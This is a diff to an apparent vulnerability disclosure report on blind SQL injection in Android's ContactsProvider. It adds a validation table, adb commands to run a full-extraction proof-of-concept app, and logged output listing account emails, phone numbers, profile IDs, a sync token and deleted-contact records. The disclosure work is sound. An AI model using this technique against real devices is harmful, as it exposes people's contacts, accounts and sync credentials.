@@ -28,13 +28,17 @@ The AOSP ContactsProvider (`com.android.providers.contacts`) is vulnerable to SQ
 
 ## Technical Details
 
-### Injection Vector
+### Three Injection Vectors
 
-The ContactsProvider passes the caller-supplied `selection` parameter into the SQL WHERE clause without validating against subqueries. While it correctly blocks:
-- **Projection injection:** "Non-token detected" (column names are validated)
-- **UNION injection:** "Unterminated comment" (catches `--` terminator)
+The ContactsProvider has **inconsistent input validation** across its three SQL parameters:
 
-It does NOT block **subqueries in the WHERE clause**, enabling boolean-based blind SQL injection.
+| Parameter | Subqueries | UNION | Comments | Result |
+|-----------|-----------|-------|----------|--------|
+| `projection` (columns) | ❌ Blocked ("Non-token detected") | ❌ Blocked | ❌ Blocked | **SAFE** |
+| `selection` (WHERE) | ✅ **ALLOWED** | ❌ Blocked | ❌ Blocked | **VULNERABLE** |
+| `sortOrder` (ORDER BY) | ✅ **ALLOWED** | N/A | N/A | **VULNERABLE** |
+
+The ContactsProvider enables `setStrict(true)` for projection but NOT for selection or sortOrder, creating a security inconsistency where two of three user-controlled SQL parameters accept arbitrary subqueries.
 
 ### Attack Mechanism
 
@@ -273,9 +277,93 @@ Via `pragma_database_list`: `main` → `/data/data/com.android.providers.contact
 | icu_version | 2 |
 | knownDirectoryPackages | 5 |
 
+## Full Database Extraction — Comprehensive PoC
+
+### PoC: Automated Full Contact Database Dump
+
+**Source:** `poc_app/src/com/vrp/poc/FullExtractionActivity.java`  
+**UID:** 10361 (regular third-party app, NOT system)  
+**Permission:** `READ_CONTACTS` only  
+
+This PoC automatically extracts ALL sensitive data from the ContactsProvider database using only blind boolean SQL injection. No UNION, no projection injection — pure WHERE clause subqueries.
+
+```bash
+adb install -r poc_app/build/poc.apk
+adb shell pm grant com.vrp.poc android.permission.READ_CONTACTS
+adb shell am start -n com.vrp.poc/.FullExtractionActivity
+adb logcat -s FullExtraction:D
+```
+
+### Extracted Data (Actual Device Output)
+
+**Database Summary:**
+```
+Tables: 35 | Contacts: 3 | RawContacts: 4 | DataRows: 13 | Accounts: 2 | Groups: 5
+```
+
+**1. Google Account Emails (GET_ACCOUNTS bypass):**
+```
+Account[0]: sandiyotest@gmail.com (com.google)
+Account[1]: attacker@evil.com (com.google)
+```
+→ Extracted from internal `accounts` table. The `GET_ACCOUNTS` permission is NOT required. Any app with only `READ_CONTACTS` can enumerate all Google accounts on the device.
+
+**2. Contact Names:**
+```
+Name[0]: san (first=san last=)
+Name[1]: test (first=test last=)
+```
+
+**3. Phone Numbers with E.164 Normalization:**
+```
+Phone[0]: 63854 36230 (normalized=+916385436230) rawContact=2
+Phone[1]: 89860 87809 (normalized=+918986087809) rawContact=1
+```
+→ Both the raw number AND the internationally-normalized number are extracted from the internal `data` table.
+
+**4. Google Profile IDs:**
+```
+Identity[0]: gprofile:-596134968363019474 ns=com.google
+```
+→ Internal Google profile identifiers not accessible through the public Contacts API.
+
+**5. Sync Tokens (Credential Material):**
+```
+Sync[0]: sandiyotest@gmail.com (com.google) dataLen=125
+  token: \MisA2Rc-NAAAABII0_HH5NXVlgMQ0_HH5NXVlgNu3b9xLoio6edpm_fRpL
+```
+→ 125 bytes of binary sync state data extracted from `_sync_state` table. Contains sync authentication material.
+
+**6. Deleted Contact Records (Data User Believed Was Erased):**
+```
+Deleted contact entries: 1
+Deleted[0]: contactId=4 at Thu Jan 01 05:29:59 GMT+05:30 1970
+```
+→ The `deleted_contacts` table retains records of contacts the user has deleted. This is NOT accessible through any public API.
+
+**7. Group Names and Membership:**
+```
+Group[0]: My Contacts () members=0
+Group[1]: Starred in Android () members=3
+Group[2]: Friends () members=0
+Group[3]: Family () members=0
+Group[4]: Coworkers () members=0
+```
+
+**8. System Information:**
+```
+SQLite: 3.50.6
+DB path: /data/data/com.android.providers.contacts/databases/contacts2.db
+```
+
+### Performance
+
+The full extraction completed in ~14 seconds (from 03:15:19 to 03:15:33), demonstrating that blind boolean SQLi is practical for real-time data exfiltration, not just theoretical.
+
 ## Evidence Files
 
 - `poc_app/src/com/vrp/poc/ContactsBlindSqliActivity.java` — PoC app source (blind extraction)
+- `poc_app/src/com/vrp/poc/FullExtractionActivity.java` — **Full automated extraction PoC** (extracts all data types)
 - `poc_app/src/com/vrp/poc/DeepContactsSqliActivity.java` — Extended URI + provider testing
 - `poc_app/src/com/vrp/poc/CrossTableSqliActivity.java` — Full schema enumeration + cross-table probing
 - `poc_app/src/com/vrp/poc/ContactsCallLogSqliActivity.java` — Initial injection test
@@ -283,9 +371,11 @@ Via `pragma_database_list`: `main` → `/data/data/com.android.providers.contact
 - `dynamic_evidence/contacts_blind_sqli_logcat.txt` — Initial extraction logcat
 - `dynamic_evidence/deep_contacts_sqli_logcat.txt` — 7 URI test + extended data extraction
 - `dynamic_evidence/cross_table_sqli_logcat.txt` — Full schema + database path + view/trigger enumeration
+- `dynamic_evidence/full_extraction_logcat.txt` — **Complete full extraction evidence** (account emails, phones, sync tokens, deleted contacts, groups)
 
 ## Timeline
 
 - **2026-09-07:** Boolean-based blind SQL injection discovered in ContactsProvider
 - **2026-09-07:** Proven from PoC app (UID 11847) — extracted account email, phone numbers, 35 table names, and database schema
 - **2026-09-07:** Expanded to 7 vulnerable URIs, full database enumeration (35 tables, 17 views, 11 triggers), database file path disclosure, all contact data types enumerated
+- **2026-09-07:** Full automated extraction PoC deployed — extracted Google account emails (GET_ACCOUNTS bypass), phone numbers with E.164 normalization, Google Profile IDs, sync tokens, deleted contact records, and group membership in 14 seconds
